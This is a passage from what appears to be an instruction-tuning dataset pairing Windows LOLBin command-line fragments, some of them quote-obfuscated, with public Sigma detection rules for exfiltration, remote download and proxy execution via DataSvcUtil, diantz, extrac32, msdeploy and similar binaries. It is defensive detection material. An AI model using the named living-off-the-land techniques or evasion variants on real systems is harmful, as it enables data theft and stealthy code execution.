process_creation\n    product: windows\ndetection:\n    selection_cli:\n        CommandLine|contains:\n            - '/in:'\n            - '/out:'\n            - '/uri:'\n    selection_img:\n        - Image|endswith: '\\DataSvcUtil.exe'\n        - OriginalFileName: 'DataSvcUtil.exe'\n    condition: all of selection*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - DataSvcUtil.exe being used may be performed by a system administrator.\n    - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - DataSvcUtil.exe being executed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/in: /out: /uri: \\\"\\\\\"\\\"D\\\"\\\"a\\\"\\\"t\\\"\\\"a\\\"\\\"S\\\"\\\"v\\\"\\\"c\\\"\\\"U\\\"\\\"t\\\"\\\"i\\\"\\\"l\\\"\\\".\\\"\\\"e\\\"\\\"x\\\"\\\"e\\\" DataSvcUtil.exe", "output": "title: LOLBAS Data Exfiltration by DataSvcUtil.exe\nid: e290b10b-1023-4452-a4a9-eb31a9013b3a\nstatus: test\ndescription: Detects when a user performs data exfiltration by using DataSvcUtil.exe\nreferences:\n    - https://gist.github.com/teixeira0xfffff/837e5bfed0d1b0a29a7cb1e5dbdd9ca6\n    - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/wcf/wcf-data-service-client-utility-datasvcutil-exe\n    - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/wcf/generating-the-data-service-client-library-wcf-data-services\n    - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/wcf/how-to-add-a-data-service-reference-wcf-data-services\n    - https://lolbas-project.github.io/lolbas/Binaries/DataSvcUtil/\nauthor: Ialle Teixeira @teixeira0xfffff, Austin Songer @austinsonger\ndate: 2021-09-30\nmodified: 2022-05-16\ntags:\n    - attack.exfiltration\n    - attack.t1567\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cli:\n        CommandLine|contains:\n            - '/in:'\n            - '/out:'\n            - '/uri:'\n    selection_img:\n        - Image|endswith: '\\DataSvcUtil.exe'\n        - OriginalFileName: 'DataSvcUtil.exe'\n    condition: all of selection*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - DataSvcUtil.exe being used may be performed by a system administrator.\n    - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - DataSvcUtil.exe being executed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/in: /out: /uri: \\DataSvcUtil DataSvcUtil", "output": "title: LOLBAS Data Exfiltration by DataSvcUtil.exe\nid: e290b10b-1023-4452-a4a9-eb31a9013b3a\nstatus: test\ndescription: Detects when a user performs data exfiltration by using DataSvcUtil.exe\nreferences:\n    - https://gist.github.com/teixeira0xfffff/837e5bfed0d1b0a29a7cb1e5dbdd9ca6\n    - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/wcf/wcf-data-service-client-utility-datasvcutil-exe\n    - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/wcf/generating-the-data-service-client-library-wcf-data-services\n    - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/wcf/how-to-add-a-data-service-reference-wcf-data-services\n    - https://lolbas-project.github.io/lolbas/Binaries/DataSvcUtil/\nauthor: Ialle Teixeira @teixeira0xfffff, Austin Songer @austinsonger\ndate: 2021-09-30\nmodified: 2022-05-16\ntags:\n    - attack.exfiltration\n    - attack.t1567\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cli:\n        CommandLine|contains:\n            - '/in:'\n            - '/out:'\n            - '/uri:'\n    selection_img:\n        - Image|endswith: '\\DataSvcUtil.exe'\n        - OriginalFileName: 'DataSvcUtil.exe'\n    condition: all of selection*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - DataSvcUtil.exe being used may be performed by a system administrator.\n    - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - DataSvcUtil.exe being executed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/in: /out: /uri: \\DataSvcUtil.exe DataSvcUtil.exe", "output": "title: LOLBAS Data Exfiltration by DataSvcUtil.exe\nid: e290b10b-1023-4452-a4a9-eb31a9013b3a\nstatus: test\ndescription: Detects when a user performs data exfiltration by using DataSvcUtil.exe\nreferences:\n    - https://gist.github.com/teixeira0xfffff/837e5bfed0d1b0a29a7cb1e5dbdd9ca6\n    - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/wcf/wcf-data-service-client-utility-datasvcutil-exe\n    - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/wcf/generating-the-data-service-client-library-wcf-data-services\n    - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/wcf/how-to-add-a-data-service-reference-wcf-data-services\n    - https://lolbas-project.github.io/lolbas/Binaries/DataSvcUtil/\nauthor: Ialle Teixeira @teixeira0xfffff, Austin Songer @austinsonger\ndate: 2021-09-30\nmodified: 2022-05-16\ntags:\n    - attack.exfiltration\n    - attack.t1567\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cli:\n        CommandLine|contains:\n            - '/in:'\n            - '/out:'\n            - '/uri:'\n    selection_img:\n        - Image|endswith: '\\DataSvcUtil.exe'\n        - OriginalFileName: 'DataSvcUtil.exe'\n    condition: all of selection*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - DataSvcUtil.exe being used may be performed by a system administrator.\n    - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - DataSvcUtil.exe being executed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DeviceCredentialDeployment.exe", "output": "title: DeviceCredentialDeployment Execution\nid: b8b1b304-a60f-4999-9a6e-c547bde03ffd\nstatus: test\ndescription: Detects the execution of DeviceCredentialDeployment to hide a process from view\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/147\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\DeviceCredentialDeployment.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\DeviceCredentialDeployment.exe\\\"", "output": "title: DeviceCredentialDeployment Execution\nid: b8b1b304-a60f-4999-9a6e-c547bde03ffd\nstatus: test\ndescription: Detects the execution of DeviceCredentialDeployment to hide a process from view\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/147\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\DeviceCredentialDeployment.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DeviceCredentialDeployment", "output": "title: DeviceCredentialDeployment Execution\nid: b8b1b304-a60f-4999-9a6e-c547bde03ffd\nstatus: test\ndescription: Detects the execution of DeviceCredentialDeployment to hide a process from view\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/147\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\DeviceCredentialDeployment.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\DeviceCredentialDeployment.exe", "output": "title: DeviceCredentialDeployment Execution\nid: b8b1b304-a60f-4999-9a6e-c547bde03ffd\nstatus: test\ndescription: Detects the execution of DeviceCredentialDeployment to hide a process from view\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/147\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\DeviceCredentialDeployment.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\devtoolslauncher.exe LaunchForDeploy", "output": "title: Devtoolslauncher.exe Executes Specified Binary\nid: cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6\nstatus: test\ndescription: The Devtoolslauncher.exe executes other binary\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Devtoolslauncher/\n    - https://twitter.com/_felamos/status/1179811992841797632\nauthor: Beyu Denis, oscd.community (rule), @_felamos (idea)\ndate: 2019-10-12\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\devtoolslauncher.exe'\n        CommandLine|contains: 'LaunchForDeploy'\n    condition: selection\nfalsepositives:\n    - Legitimate use of devtoolslauncher.exe by legitimate user\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\devtoolslauncher.exe \"LaunchF\"orDeploy", "output": "title: Devtoolslauncher.exe Executes Specified Binary\nid: cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6\nstatus: test\ndescription: The Devtoolslauncher.exe executes other binary\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Devtoolslauncher/\n    - https://twitter.com/_felamos/status/1179811992841797632\nauthor: Beyu Denis, oscd.community (rule), @_felamos (idea)\ndate: 2019-10-12\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\devtoolslauncher.exe'\n        CommandLine|contains: 'LaunchForDeploy'\n    condition: selection\nfalsepositives:\n    - Legitimate use of devtoolslauncher.exe by legitimate user\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\devtoolslauncher LaunchForDeploy", "output": "title: Devtoolslauncher.exe Executes Specified Binary\nid: cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6\nstatus: test\ndescription: The Devtoolslauncher.exe executes other binary\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Devtoolslauncher/\n    - https://twitter.com/_felamos/status/1179811992841797632\nauthor: Beyu Denis, oscd.community (rule), @_felamos (idea)\ndate: 2019-10-12\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\devtoolslauncher.exe'\n        CommandLine|contains: 'LaunchForDeploy'\n    condition: selection\nfalsepositives:\n    - Legitimate use of devtoolslauncher.exe by legitimate user\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\devtoolslauncher.exe LaunchForDeploy", "output": "title: Devtoolslauncher.exe Executes Specified Binary\nid: cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6\nstatus: test\ndescription: The Devtoolslauncher.exe executes other binary\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Devtoolslauncher/\n    - https://twitter.com/_felamos/status/1179811992841797632\nauthor: Beyu Denis, oscd.community (rule), @_felamos (idea)\ndate: 2019-10-12\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\devtoolslauncher.exe'\n        CommandLine|contains: 'LaunchForDeploy'\n    condition: selection\nfalsepositives:\n    - Legitimate use of devtoolslauncher.exe by legitimate user\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "diantz.exe \\\\\\\\ .cab", "output": "title: Suspicious Diantz Download and Compress Into a CAB File\nid: 185d7418-f250-42d0-b72e-0c8b70661e93\nstatus: test\ndescription: Download and compress a remote file and store it in a cab file on local machine.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Diantz/\nauthor: frack113\ndate: 2021-11-26\nmodified: 2022-08-13\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - diantz.exe\n            - ' \\\\\\\\'\n            - '.cab'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "diantz.exe \\\\\\\\ \".\"\"c\"\"a\"\"b\"", "output": "title: Suspicious Diantz Download and Compress Into a CAB File\nid: 185d7418-f250-42d0-b72e-0c8b70661e93\nstatus: test\ndescription: Download and compress a remote file and store it in a cab file on local machine.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Diantz/\nauthor: frack113\ndate: 2021-11-26\nmodified: 2022-08-13\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - diantz.exe\n            - ' \\\\\\\\'\n            - '.cab'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "diantz \\\\\\\\ .cab", "output": "title: Suspicious Diantz Download and Compress Into a CAB File\nid: 185d7418-f250-42d0-b72e-0c8b70661e93\nstatus: test\ndescription: Download and compress a remote file and store it in a cab file on local machine.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Diantz/\nauthor: frack113\ndate: 2021-11-26\nmodified: 2022-08-13\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - diantz.exe\n            - ' \\\\\\\\'\n            - '.cab'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "diantz.exe \\\\\\\\ .cab", "output": "title: Suspicious Diantz Download and Compress Into a CAB File\nid: 185d7418-f250-42d0-b72e-0c8b70661e93\nstatus: test\ndescription: Download and compress a remote file and store it in a cab file on local machine.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Diantz/\nauthor: frack113\ndate: 2021-11-26\nmodified: 2022-08-13\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - diantz.exe\n            - ' \\\\\\\\'\n            - '.cab'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "extrac32.exe \\extrac32.exe extrac32.exe .cab /C /Y \\\\\\\\", "output": "title: Suspicious Extrac32 Execution\nid: aa8e035d-7be4-48d3-a944-102aec04400d\nstatus: test\ndescription: Download or Copy file with Extrac32\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Extrac32/\nauthor: frack113\ndate: 2021-11-26\nmodified: 2022-08-13\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_lolbas:\n        - CommandLine|contains: extrac32.exe\n        - Image|endswith: '\\extrac32.exe'\n        - OriginalFileName: 'extrac32.exe'\n    selection_archive:\n        CommandLine|contains: '.cab'\n    selection_options:\n        CommandLine|contains:\n            - /C\n            - /Y\n            - ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "extrac32.exe \"\\extrac32.exe\" extrac32.exe .cab /C /Y \\\\\\\\", "output": "title: Suspicious Extrac32 Execution\nid: aa8e035d-7be4-48d3-a944-102aec04400d\nstatus: test\ndescription: Download or Copy file with Extrac32\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Extrac32/\nauthor: frack113\ndate: 2021-11-26\nmodified: 2022-08-13\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_lolbas:\n        - CommandLine|contains: extrac32.exe\n        - Image|endswith: '\\extrac32.exe'\n        - OriginalFileName: 'extrac32.exe'\n    selection_archive:\n        CommandLine|contains: '.cab'\n    selection_options:\n        CommandLine|contains:\n            - /C\n            - /Y\n            - ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "extrac32 \\extrac32 extrac32 .cab /C /Y \\\\\\\\", "output": "title: Suspicious Extrac32 Execution\nid: aa8e035d-7be4-48d3-a944-102aec04400d\nstatus: test\ndescription: Download or Copy file with Extrac32\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Extrac32/\nauthor: frack113\ndate: 2021-11-26\nmodified: 2022-08-13\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_lolbas:\n        - CommandLine|contains: extrac32.exe\n        - Image|endswith: '\\extrac32.exe'\n        - OriginalFileName: 'extrac32.exe'\n    selection_archive:\n        CommandLine|contains: '.cab'\n    selection_options:\n        CommandLine|contains:\n            - /C\n            - /Y\n            - ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "extrac32.exe \\extrac32.exe extrac32.exe .cab /C /Y \\\\\\\\", "output": "title: Suspicious Extrac32 Execution\nid: aa8e035d-7be4-48d3-a944-102aec04400d\nstatus: test\ndescription: Download or Copy file with Extrac32\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Extrac32/\nauthor: frack113\ndate: 2021-11-26\nmodified: 2022-08-13\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_lolbas:\n        - CommandLine|contains: extrac32.exe\n        - Image|endswith: '\\extrac32.exe'\n        - OriginalFileName: 'extrac32.exe'\n    selection_archive:\n        CommandLine|contains: '.cab'\n    selection_options:\n        CommandLine|contains:\n            - /C\n            - /Y\n            - ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Launch-VsDevShell.ps1 VsWherePath VsInstallationPath", "output": "title: Launch-VsDevShell.PS1 Proxy Execution\nid: 45d3a03d-f441-458c-8883-df101a3bb146\nstatus: test\ndescription: Detects the use of the 'Launch-VsDevShell.ps1' Microsoft signed script to execute commands.\nreferences:\n    - https://twitter.com/nas_bench/status/1535981653239255040\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\ntags:\n    - attack.defense-evasion\n    - attack.t1216.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_script:\n        CommandLine|contains: 'Launch-VsDevShell.ps1'\n    selection_flags:\n        CommandLine|contains:\n            - 'VsWherePath '\n            - 'VsInstallationPath '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of the script by a developer\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Launch-VsDevShell.ps1 \"V\"\"s\"\"W\"\"h\"\"e\"\"r\"\"e\"\"P\"\"a\"\"t\"\"h\" VsInstallationPath", "output": "title: Launch-VsDevShell.PS1 Proxy Execution\nid: 45d3a03d-f441-458c-8883-df101a3bb146\nstatus: test\ndescription: Detects the use of the 'Launch-VsDevShell.ps1' Microsoft signed script to execute commands.\nreferences:\n    - https://twitter.com/nas_bench/status/1535981653239255040\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\ntags:\n    - attack.defense-evasion\n    - attack.t1216.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_script:\n        CommandLine|contains: 'Launch-VsDevShell.ps1'\n    selection_flags:\n        CommandLine|contains:\n            - 'VsWherePath '\n            - 'VsInstallationPath '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of the script by a developer\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Launch-VsDevShell VsWherePath VsInstallationPath", "output": "title: Launch-VsDevShell.PS1 Proxy Execution\nid: 45d3a03d-f441-458c-8883-df101a3bb146\nstatus: test\ndescription: Detects the use of the 'Launch-VsDevShell.ps1' Microsoft signed script to execute commands.\nreferences:\n    - https://twitter.com/nas_bench/status/1535981653239255040\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\ntags:\n    - attack.defense-evasion\n    - attack.t1216.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_script:\n        CommandLine|contains: 'Launch-VsDevShell.ps1'\n    selection_flags:\n        CommandLine|contains:\n            - 'VsWherePath '\n            - 'VsInstallationPath '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of the script by a developer\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Launch-VsDevShell.ps1 VsWherePath VsInstallationPath", "output": "title: Launch-VsDevShell.PS1 Proxy Execution\nid: 45d3a03d-f441-458c-8883-df101a3bb146\nstatus: test\ndescription: Detects the use of the 'Launch-VsDevShell.ps1' Microsoft signed script to execute commands.\nreferences:\n    - https://twitter.com/nas_bench/status/1535981653239255040\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\ntags:\n    - attack.defense-evasion\n    - attack.t1216.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_script:\n        CommandLine|contains: 'Launch-VsDevShell.ps1'\n    selection_flags:\n        CommandLine|contains:\n            - 'VsWherePath '\n            - 'VsInstallationPath '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of the script by a developer\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wscript.exe wscript.exe manage-bde.wsf \\cscript.exe \\wscript.exe manage-bde.wsf \\cmd.exe", "output": "title: Potential Manage-bde.wsf Abuse To Proxy Execution\nid: c363385c-f75d-4753-a108-c1a8e28bdbda\nstatus: test\ndescription: Detects potential abuse of the \"manage-bde.wsf\" script as a LOLBIN to proxy execution\nreferences:\n    - https://lolbas-project.github.io/lolbas/Scripts/Manage-bde/\n    - https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712\n    - https://twitter.com/bohops/status/980659399495741441\n    - https://twitter.com/JohnLaTwC/status/1223292479270600706\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1216/T1216.md\nauthor: oscd.community, Natalia Shornikova, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-10-13\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_wscript_img:\n        - Image|endswith: '\\wscript.exe'\n        - OriginalFileName: 'wscript.exe'\n    selection_wscript_cli:\n        CommandLine|contains: 'manage-bde.wsf'\n    selection_parent:\n        ParentImage|endswith:\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n        ParentCommandLine|contains: 'manage-bde.wsf'\n    selection_filter_cmd:\n        Image|endswith: '\\cmd.exe'\n    condition: all of selection_wscript_* or (selection_parent and not selection_filter_cmd)\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wscript.exe wscript.exe manage-bde.wsf \\cscript.exe \\wscript.exe manage-bde.wsf \\cmd\\\".exe\\\"", "output": "title: Potential Manage-bde.wsf Abuse To Proxy Execution\nid: c363385c-f75d-4753-a108-c1a8e28bdbda\nstatus: test\ndescription: Detects potential abuse of the \"manage-bde.wsf\" script as a LOLBIN to proxy execution\nreferences:\n    - https://lolbas-project.github.io/lolbas/Scripts/Manage-bde/\n    - https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712\n    - https://twitter.com/bohops/status/980659399495741441\n    - https://twitter.com/JohnLaTwC/status/1223292479270600706\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1216/T1216.md\nauthor: oscd.community, Natalia Shornikova, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-10-13\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_wscript_img:\n        - Image|endswith: '\\wscript.exe'\n        - OriginalFileName: 'wscript.exe'\n    selection_wscript_cli:\n        CommandLine|contains: 'manage-bde.wsf'\n    selection_parent:\n        ParentImage|endswith:\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n        ParentCommandLine|contains: 'manage-bde.wsf'\n    selection_filter_cmd:\n        Image|endswith: '\\cmd.exe'\n    condition: all of selection_wscript_* or (selection_parent and not selection_filter_cmd)\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wscript wscript manage-bde.wsf \\cscript \\wscript manage-bde.wsf \\cmd", "output": "title: Potential Manage-bde.wsf Abuse To Proxy Execution\nid: c363385c-f75d-4753-a108-c1a8e28bdbda\nstatus: test\ndescription: Detects potential abuse of the \"manage-bde.wsf\" script as a LOLBIN to proxy execution\nreferences:\n    - https://lolbas-project.github.io/lolbas/Scripts/Manage-bde/\n    - https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712\n    - https://twitter.com/bohops/status/980659399495741441\n    - https://twitter.com/JohnLaTwC/status/1223292479270600706\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1216/T1216.md\nauthor: oscd.community, Natalia Shornikova, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-10-13\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_wscript_img:\n        - Image|endswith: '\\wscript.exe'\n        - OriginalFileName: 'wscript.exe'\n    selection_wscript_cli:\n        CommandLine|contains: 'manage-bde.wsf'\n    selection_parent:\n        ParentImage|endswith:\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n        ParentCommandLine|contains: 'manage-bde.wsf'\n    selection_filter_cmd:\n        Image|endswith: '\\cmd.exe'\n    condition: all of selection_wscript_* or (selection_parent and not selection_filter_cmd)\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wscript.exe wscript.exe manage-bde.wsf \\cscript.exe \\wscript.exe manage-bde.wsf \\cmd.exe", "output": "title: Potential Manage-bde.wsf Abuse To Proxy Execution\nid: c363385c-f75d-4753-a108-c1a8e28bdbda\nstatus: test\ndescription: Detects potential abuse of the \"manage-bde.wsf\" script as a LOLBIN to proxy execution\nreferences:\n    - https://lolbas-project.github.io/lolbas/Scripts/Manage-bde/\n    - https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712\n    - https://twitter.com/bohops/status/980659399495741441\n    - https://twitter.com/JohnLaTwC/status/1223292479270600706\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1216/T1216.md\nauthor: oscd.community, Natalia Shornikova, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-10-13\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1216\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_wscript_img:\n        - Image|endswith: '\\wscript.exe'\n        - OriginalFileName: 'wscript.exe'\n    selection_wscript_cli:\n        CommandLine|contains: 'manage-bde.wsf'\n    selection_parent:\n        ParentImage|endswith:\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n        ParentCommandLine|contains: 'manage-bde.wsf'\n    selection_filter_cmd:\n        Image|endswith: '\\cmd.exe'\n    condition: all of selection_wscript_* or (selection_parent and not selection_filter_cmd)\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "verb:sync -source:RunCommand -dest:runCommand \\msdeploy.exe", "output": "title: Execute Files with Msdeploy.exe\nid: 646bc99f-6682-4b47-a73a-17b1b64c9d34\nstatus: test\ndescription: Detects file execution using the msdeploy.exe lolbin\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msdeploy/\n    - https://twitter.com/pabraeken/status/995837734379032576\n    - https://twitter.com/pabraeken/status/999090532839313408\nauthor: Beyu Denis, oscd.community\ndate: 2020-10-18\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'verb:sync'\n            - '-source:RunCommand'\n            - '-dest:runCommand'\n        Image|endswith: '\\msdeploy.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - System administrator Usage\nlevel: medium"}
